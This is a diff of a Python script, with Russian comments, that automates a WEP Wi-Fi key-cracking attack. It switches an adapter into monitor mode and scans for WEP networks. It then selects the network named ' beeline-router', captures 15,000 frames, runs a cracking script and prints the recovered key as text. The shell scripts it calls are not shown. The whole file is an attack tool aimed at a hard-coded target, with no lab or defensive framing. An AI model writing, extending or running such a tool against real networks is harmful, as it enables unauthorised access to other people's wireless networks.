@@ -8,24 +8,36 @@ from io import StringIO
 
 # State
 currentMonitorAdapter = "_no_adapter_"
+
 isPollingNetworks = False
-isDumpingNetword = False
+pollingProcess = subprocess.Popen
+
+isDumpingNetwork = False
+dumpingProcess = subprocess.Popen
 
 # Const
 framesNeeded = 15000
+keySolveTimeout = 6
+frameCheckTimeout = 6
+wifiSearchTimeout = 10
 
 def checkMonitorAdapter():
     return currentMonitorAdapter != "_no_adapter_"
 
 def main():
     try:
+        # Получаем список Wi-Fi адаптеров
         adapters = GetAdapters()
+        # Переводим в режим мониторинга адаптер из списка
         SwitchMonitorMode(adapters[0])
-        process = StartWepNetworksSearching()
-        time.sleep(10)
-        StopWepNetworksSearching(process)
-
+        # Начинаем процесс обнаружения Wi-Fi сетей
+        StartWepNetworksSearching()
+        time.sleep(wifiSearchTimeout)
+        # Завершаем процесс обнаружения Wi-Fi сетей
+        StopWepNetworksSearching()
+        # Получаем Сети
         networks = GetWepNetworks()
+
         i = networks["SSID"].index(" beeline-router")
         bssid = networks["BSSID"][i]
         Channel = networks["Channel"][i]
@@ -35,15 +47,18 @@ def main():
 
         framesReady = 0
         while (framesReady < framesNeeded):
-            time.sleep(6)
+            time.sleep(frameCheckTimeout)
             framesReady = GetFramesQuantity()
 
-        print("END OF REC")
         StopNetworkDumping(dumpingProcess)
+
+        keyStr = GetNetworkKey()
+        print(keyStr)
     finally:
-        StopWepNetworksSearching(process)
+        StopWepNetworksSearching()
         StopNetworkDumping(dumpingProcess)
-        subprocess.run(["bash", "clean.sh", currentMonitorAdapter])
+
+        CleanAllPosteffects()
         return
 
 # return exit code of child process
@@ -53,7 +68,7 @@ def Prepare() -> int:
 
 def GetAdapters():
     subprocess.run(["bash", "GetAdapters.sh"])
-    adaptersDf = pd.read_csv('adapters.txt', sep='\t')
+    adaptersDf = pd.read_csv('adapters.txt', sep='\t', skipinitialspace=True)
     adapters = list(adaptersDf['Interface'])
     subprocess.run(['sudo', 'rm', 'adapters.txt'])
 
@@ -71,22 +86,26 @@ def StartWepNetworksSearching():
         process = subprocess.Popen(["sudo", "bash", "WepNetworkSearching.sh", currentMonitorAdapter])
         global isPollingNetworks
         isPollingNetworks = True
+        global pollingProcess
+        pollingProcess = process
         return process
     return 0
 
-def StopWepNetworksSearching(process : subprocess.Popen):
+def StopWepNetworksSearching():
     global isPollingNetworks
     isPollingNetworks = False
 
-    process.terminate()
+    global pollingProcess
+    pollingProcess.terminate()
+
     return
 
 def GetWepNetworks():
     if (checkMonitorAdapter()):
-        networksDf = pd.read_csv('networks.temp-01.csv', sep=',')
+        networksDf = pd.read_csv('networks.temp-01.csv', sep=',', skipinitialspace=True)
         bssidList = list(networksDf["BSSID"])
-        channelList = list(networksDf[" channel"])
-        ssidList = list(networksDf[" ESSID"])
+        channelList = list(networksDf["channel"])
+        ssidList = list(networksDf["ESSID"])
 
         listLen = bssidList.index('Station MAC')
         bssidList = bssidList[:listLen]
@@ -94,6 +113,7 @@ def GetWepNetworks():
         ssidList = ssidList[:listLen]
 
         outList = dict(zip(["BSSID", "Channel", "SSID"], [bssidList, channelList, ssidList]))
+
         return outList
 
     return []
@@ -105,10 +125,7 @@ def StartNetworkDumping(network):
 def StopNetworkDumping(process : subprocess.Popen):
     process.terminate()
 
-
 def GetFramesQuantity() -> int:
-    # framesStateDf = pd.read_csv('basic_wep.cap-01.csv', sep=',')
-    # probedList = (int(k) for k in framesStateDf[" Probed ESSIDs"])
     with open('basic_wep.cap-01.csv', 'r') as file:
         lines = file.readlines()
 
@@ -126,37 +143,45 @@ def GetFramesQuantity() -> int:
             table2_lines.append(line)
 
     # Создание DataFrame для первой таблицы
-    table1 = pd.read_csv(StringIO(''.join(table1_lines)))
+    table1 = pd.read_csv(StringIO(''.join(table1_lines)), skipinitialspace=True)
 
     # Создание DataFrame для второй таблицы
-    table2 = pd.read_csv(StringIO(''.join(table2_lines)))
-    tempList = [int(k) for k in table2[" # packets"]]
+    table2 = pd.read_csv(StringIO(''.join(table2_lines)), skipinitialspace=True)
+    tempList = [int(k) for k in table2["# packets"]]
 
     return max(tempList)
-
 
 
 def GetNetworkKey():
     process = subprocess.Popen(["bash", "CrackKey.sh"])
 
-    time.sleep(5)
+    time.sleep(keySolveTimeout)
     process.terminate()
 
     # if key exists return GetAsciiKey else return False
+    try:
+        with open('key.log', 'r') as file:
+            key = file.readline()
+    except:
+        return False
 
-    return True
+    subprocess.run(['sudo', 'rm', 'key.log'])
+    keyStr = GetAsciiKey(key)
+    return keyStr
 
-def GetAsciiKey() -> str:
-    # parse key.log file if GetNetworkKey Succeeded
+def GetAsciiKey(hex_string : str) -> str:
+    # Remove any spaces if present
+    hex_string = hex_string.replace(" ", "")
+    # Convert hex to bytes
+    byte_array = bytes.fromhex(hex_string)
+    # Decode bytes to string (assuming UTF-8 encoding)
+    char_string = byte_array.decode('utf-8')
+    return char_string
+
+
+def CleanAllPosteffects():
+    subprocess.run(["bash", "clean.sh", currentMonitorAdapter])
     return
 
-def RemoveTempFiles():
-    return
-
-def BackendShutdown():
-    return
-
-# if __name__ == '__main__':
-#     main()
-
-GetNetworkKey()
+if __name__ == '__main__':
+    main()
